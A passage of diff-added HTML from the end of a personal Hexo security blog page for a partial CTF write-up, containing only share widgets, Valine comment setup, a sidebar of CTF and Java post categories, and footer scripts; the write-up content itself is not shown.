+                    <a class="donate" href="javascript:;"><i class="fa fa-bitcoin"></i> 打赏</a>
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "http://example.com/posts/25143.html",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "http://example.com/posts/25143.html";
+            const title         = "「巅峰极客2024部分题解」";
+            const excerpt       = `尽力了，自己还是太菜了`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    <a class="tag-none-link" href="/tags/Web/" rel="tag">Web</a>
+                </div>
+                <div class="pull-date">
+                    <time datetime="2024-08-18T04:51:02.816Z" itemprop="dateModified">最后编辑：2024-08-18</time>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" TFCCTF2024 web方向部分题解" href="/posts/12526.html">&lt; 上一篇</a>
+            </div>
+            
+            
+        </nav>
+    
+    
+        <div id="v-comments" class="post-comments bg-image"></div>
+<script>
+    var load_comm = () => {
+        const init = () => {
+            new Valine({
+                el: '#v-comments',
+                appId: 'bNjjbBH5XN8401rWT4xZhbCF-gzGzoHsz',
+                appKey: 'R4c5rtiMieN1Kb3frShXDfw8',
+                visitor: true,
+                enableQQ: false,
+                path: '/posts/25143.html'
+                
+            });
+        }
+        if (typeof Valine === 'undefined') {
+            const src = '/vendors/valine@1.4.18/dist/Valine.min.js';
+            $.getScript(src, init);
+        } else {
+            init();
+        }
+    };
+</script>
+
+
+<script>
+<style>
+    .v .veditor{min-height: 10rem;
+        background-image: url(https://cdn.jsdelivr.net/gh/cungudafa/img/images/girls2.png);
+        background-size: contain;
+        background-repeat: no-repeat;
+        background-position: right;
+        background-color: rgba(255,255,255,0);
+        resize: none;}
+</style>
+</script>
+
+
+    <script>
+        new Valine({
+            el: '#vcomments',
+            lang: 'zh-cn',
+            admin_email: '83635877@qq.com',//博主邮箱
+            appId: "",
+            appKey: "",
+            path: window.location.pathname,
+            comment_count: true,
+            //notify: false, // 邮件提醒!使用第三方就不要添加这个!!
+            //verify: true, //验证码
+            avatar: 'monsterid',//小怪物头像
+            placeholder: "qwq~"
+        });
+        
+</script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    <script type="text/javascript">
+        jinrishici.load(function(result) {
+            var jrsc_plac =  result.data.content + "\n「" + result.data.origin.title + "」" + result.data.origin.dynasty + " · " + result.data.origin.author;
+            document.getElementById("veditor").setAttribute("placeholder",jrsc_plac);
+        })
+    </script>
+
+<noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://valine.js.org/">comments powered by Valine.</a></noscript>
+
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+        <script src="./js/src/Valine.min.js"></script>   
+        
+        
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/touxiang.png" loading="lazy" decoding="auto" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+    <div class="site-meta">
+        <a class="meta-item" href="/archives/">
+            <span class="title">
+                文章
+            </span>
+            <span class="count">
+                72
+            </span>
+        </a>
+        <a class="meta-item" href="/categories/">
+            <span class="title">
+                分类
+            </span>
+            <span class="count">
+                12
+            </span>
+        </a>
+        <a class="meta-item" href="/tags/">
+            <span class="title">
+                标签
+            </span>
+            <span class="count">
+                14
+            </span>
+        </a>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">-CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">15</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/java/">java</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web/">CTF Web</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web-WriteUp/">CTF Web WriteUp</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-WriteUp/">CTF WriteUp</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intro/">Intro</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A%E7%B3%BB%E5%88%97/">不务正业系列</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">基础漏洞</a><span class="category-list-count">15</span></li></ul>
+  </aside>
+
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
+      <div class="tag-clouds">
+        <a href="/tags/Introduce-Myself/" style="font-size: 0.6em;">Introduce_Myself</a> <a href="/tags/Java/" style="font-size: 0.6em;">Java</a> <a href="/tags/Misc/" style="font-size: 0.63em;">Misc</a> <a href="/tags/POST/" style="font-size: 0.69em;">POST</a> <a href="/tags/RCE/" style="font-size: 0.69em;">RCE</a> <a href="/tags/SQL-Injection/" style="font-size: 0.71em;">SQL_Injection</a> <a href="/tags/Upload/" style="font-size: 0.6em;">Upload</a> <a href="/tags/Web/" style="font-size: 0.8em;">Web</a> <a href="/tags/awd/" style="font-size: 0.66em;">awd</a> <a href="/tags/java/" style="font-size: 0.74em;">java</a> <a href="/tags/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A/" style="font-size: 0.6em;">不务正业</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" style="font-size: 0.77em;">基础漏洞</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 0.6em;">杂项</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 0.66em;">渗透</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/posts/25143.html"><i class="fa  fa-book"></i> 巅峰极客2024部分题解</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/12526.html"><i class="fa  fa-book"></i> TFCCTF2024 web方向部分题解</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/28398.html"><i class="fa  fa-book"></i> 流量分析学习</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/52077.html"><i class="fa  fa-book"></i> dasctf暑期挑战赛easyjob复现</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/35553.html"><i class="fa  fa-book"></i> CISCN ezjava另解</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        <li><a target="_blank" rel="nofollow" href="https://weibo.com/u/HyDr0genSpectRuM"><i class="fa fa-weibo"></i></a></li>
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://twitter.com/Err0r2333"><i class="fa fa-twitter"></i></a></li>
+                        
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/Err0r233"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2024 Err0r233 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Err0r2333.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                        <div id="binft"></div>
+  <script>
+    var binft = function (r) {
+      function t() {
+        return b[Math.floor(Math.random() * b.length)]
+      }  
+      function e() {
+        return String.fromCharCode(94 * Math.random() + 33)
+      }
+      function n(r) {
+        for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {
+          var l = document.createElement("span");
+          l.textContent = e(), l.style.color = t(), n.appendChild(l)
+        }
+        return n
+      }
+      function i() {
+        var t = o[c.skillI];
+        c.step ? c.step-- : (c.step = g, c.prefixP < l.length ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++) : "forward" === c.direction ? c.skillP < t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = "backward", c.delay = a) : c.skillP > 0 ? (c.text = c.text.slice(0, -1), c.skillP--) : (c.skillI = (c.skillI + 1) % o.length, c.direction = "forward")), r.textContent = c.text, r.appendChild(n(c.prefixP < l.length ? Math.min(s, s + c.prefixP) : Math.min(s, t.length - c.skillP))), setTimeout(i, d)
+      }
+      var l = "",
+      o = ["青青陵上柏，磊磊涧中石。", "人生天地间，忽如远行客。","斗酒相娱乐，聊厚不为薄。", "驱车策驽马，游戏宛与洛。","洛中何郁郁，冠带自相索。","长衢罗夹巷，王侯多第宅。","两宫遥相望，双阙百余尺。","极宴娱心意，戚戚何所迫？"].map(function (r) {
+      return r + ""
+      }),
+      a = 2,
+      g = 1,
+      s = 5,
+      d = 75,
+      b = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"],
+      c = {
+        text: "",
+        prefixP: -s,
+        skillI: 0,
+        skillP: 0,
+        direction: "forward",
+        delay: a,
+        step: g
+      };
+      i()
+      };
+      binft(document.getElementById('binft'));
+  </script>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+
+        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="7733928587"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+    <script defer src="/vendors/layui-src@2.5.5/dist/layui.all.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+
+    </body>
+</html>
